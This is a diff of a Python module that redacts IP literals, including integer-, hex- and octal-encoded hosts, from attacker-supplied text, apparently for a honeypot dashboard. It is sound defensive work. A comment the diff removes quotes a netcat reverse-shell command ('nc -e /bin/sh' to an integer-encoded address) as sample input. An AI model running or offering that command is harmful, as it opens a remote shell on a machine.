@@ -8,15 +8,14 @@ dashboard/src/utils/redactIps.ts - keep the two in sync.
 from __future__ import annotations
 
 import re
+from typing import overload
 
-IP_BLOT = "‹ip›"  # the same token the dashboard uses
+IP_BLOT = "<ip>"  # must stay byte-identical to dashboard IP_BLOT
 
-# IPv4: four dot-separated octets 0-255.
 _IPV4 = (
     r"(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
 )
 
-# IPv6, canonical matcher.
 _IPV6_CORE = "|".join(
     [
         r"(?:[0-9A-Fa-f]{1,4}:){6}" + _IPV4,
@@ -35,10 +34,10 @@ _IPV6_CORE = "|".join(
 )
 _IPV6 = r"(?<![0-9A-Fa-f:])(?:" + _IPV6_CORE + r")(?:%[0-9A-Za-z]+)?(?![0-9A-Fa-f:])"
 
-# Standalone dotted-quad. The lookbehind/lookahead reject a 5th adjacent octet so
-# version strings like `lib.so.1.2.3.4.5` are not partially blotted, while a
-# real IP at a sentence end still matches.
-_IPV4_STANDALONE = r"(?<!\d\.)\b" + _IPV4 + r"\b(?!\.\d)"
+# Use digit-dot guards, not \b: underscore is a word char, so \b fails on
+# banners like MGLNDD_IP_PORT. Guards prevent false negatives (version strings
+# like lib.so.1.2.3.4.5) and false positives (embedded IPs in filenames).
+_IPV4_STANDALONE = r"(?<!\d\.)(?<![0-9A-Za-z])" + _IPV4 + r"(?![0-9A-Za-z])(?!\.\d)"
 
 # Alternate-encoding hosts only carry meaning right after a URL scheme: decimal
 # (`http://2130706433/`), hex (`http://0x7f000001/`), octal, or dotted-hex
@@ -53,26 +52,19 @@ _URL_NUMERIC_HOST = (
     r"(?P<host>" + _NUMERIC_HOST + r")(?!:[0-9A-Fa-f]*:)(?=[/:?#\s]|$)"
 )
 
-# Shell commands drop the scheme entirely (`nc -e /bin/sh 2130706433 4444`,
-# `nc 0x7f000001 4444`), so a bare integer-encoded IP has to be caught without
-# one. Bounded on both sides and long enough (hex >=5 digits, octal 8-11
-# digits, decimal 8-10 digits) to stay clear of ports, chmod flags, `sleep 30`,
-# `bs=1024`; `_replace` additionally requires the parsed value to land in
-# 16777216..4294967295 (first octet >= 1) before it blots the token.
-# Accepted false positive: a bare current-era unix timestamp is 10 digits and
-# sits inside that range, so `echo 1735689600` gets blotted. Over-redacting a
-# timestamp is the cheaper mistake than leaking a third-party host.
+# Shell commands pass numeric IPs without scheme (nc host port); boundedness
+# and range-check avoid false positives on ports/flags/durations (bash literals).
+# Tradeoff: bare 10-digit timestamps (1735689600) also match IPv4 range; better
+# to over-redact timestamps than leak third-party hosts.
 _SCHEMELESS_NUMERIC_HOST = (
     r"(?<![\w.:-])"
     r"(?P<numtok>0[xX][0-9A-Fa-f]{5,8}|0[0-7]{8,11}|\d{8,10})"
     r"(?![\w.:-])"
 )
 
-# Token first (idempotent re-redaction); then IPv6 (incl. embedded-v4) so a full
-# literal wins over the numeric-host rules; dotted-quad; scheme-qualified
-# numeric-host; schemeless numeric-host last since it is the most conservative
-# (range-checked) fallback.
-_IP_RE = re.compile(
+# Order: token (idempotent), IPv6 (wins over numeric rules), dotted-quad,
+# scheme-qualified numeric-host, schemeless last (most conservative, range-checked).
+_LITERAL_ALTS = (
     "(?:"
     + re.escape(IP_BLOT)
     + ")|(?:"
@@ -81,9 +73,19 @@ _IP_RE = re.compile(
     + _IPV4_STANDALONE
     + ")|(?:"
     + _URL_NUMERIC_HOST
-    + ")|(?:"
-    + _SCHEMELESS_NUMERIC_HOST
     + ")"
+)
+_IP_RE = re.compile(_LITERAL_ALTS + "|(?:" + _SCHEMELESS_NUMERIC_HOST + ")")
+
+# Exclude schemeless bare-integer heuristic: safe for shell commands (nc host)
+# but unsafe for credentials (123456789 is a common password, would blot into <ip>).
+_IP_RE_LITERAL = re.compile(_LITERAL_ALTS)
+
+# Detects numeric-only hosts (including 0.0.0.1) that bypass the range gate,
+# while leaving real DNS names alone.
+_NUMERIC_HOST_ONLY = re.compile(
+    r"^(?:0[xX][0-9A-Fa-f]+|0[0-7]+|\d+)"
+    r"(?:\.(?:0[xX][0-9A-Fa-f]+|0[0-7]+|\d+))*\.?$"
 )
 
 # Valid IPv4-as-integer range with the first octet >= 1 (0.x.x.x is not a
@@ -118,18 +120,44 @@ def _replace(m: re.Match[str]) -> str:
     return IP_BLOT
 
 
-def redact_ips(text: str | None) -> str | None:
-    """Return text with every IP literal replaced by ‹ip›.
+@overload
+def redact_ips(text: str, *, numeric_hosts: bool = True) -> str: ...
 
-    Covers IPv4, IPv6 (with embedded-v4 and URL forms), numeric URL hosts.
-    None passes through; already-blotted text is unchanged.
 
-    Arguments:
-      text: free text from attacker; may contain IP literals
+@overload
+def redact_ips(text: None, *, numeric_hosts: bool = True) -> None: ...
 
-    Returns:
-      text with IPs blotted; None if input is None
+
+def redact_ips(text: str | None, *, numeric_hosts: bool = True) -> str | None:
+    """Replace IP literals and numeric URL hosts with <ip>.
+
+    Set numeric_hosts=False for credentials and SSH banners where numbers
+    like "123456789" are valid passwords, not hosts to redact.
     """
     if text is None:
         return None
-    return _IP_RE.sub(_replace, text)
+    pattern = _IP_RE if numeric_hosts else _IP_RE_LITERAL
+    return pattern.sub(_replace, text)
+
+
+def safe_host(host: str | None) -> str | None:
+    """Return host only when it is a real DNS name that embeds no IP.
+
+    Used for the payload `host` and relay `network` labels, which the schema
+    promises are "never an IP". `ipaddress.ip_address()` alone was too weak: it
+    accepts neither `0x7f000001` nor `192.168.001.1` nor a trailing-dot
+    `1.2.3.4.`, and it cannot see an IP wrapped in wildcard DNS
+    (`185.220.101.5.nip.io`). There is nothing truthful to substitute, so a
+    host that fails either check becomes None rather than a blot.
+
+    Deliberately tolerant of anything that is not an address encoding: the
+    relay `network` column is usually an AS org name, so "Cloudflare, Inc."
+    and "YANDEX LLC" must survive untouched.
+    """
+    if not host:
+        return None
+    if redact_ips(host) != host:
+        return None
+    if _NUMERIC_HOST_ONLY.match(host):
+        return None
+    return host
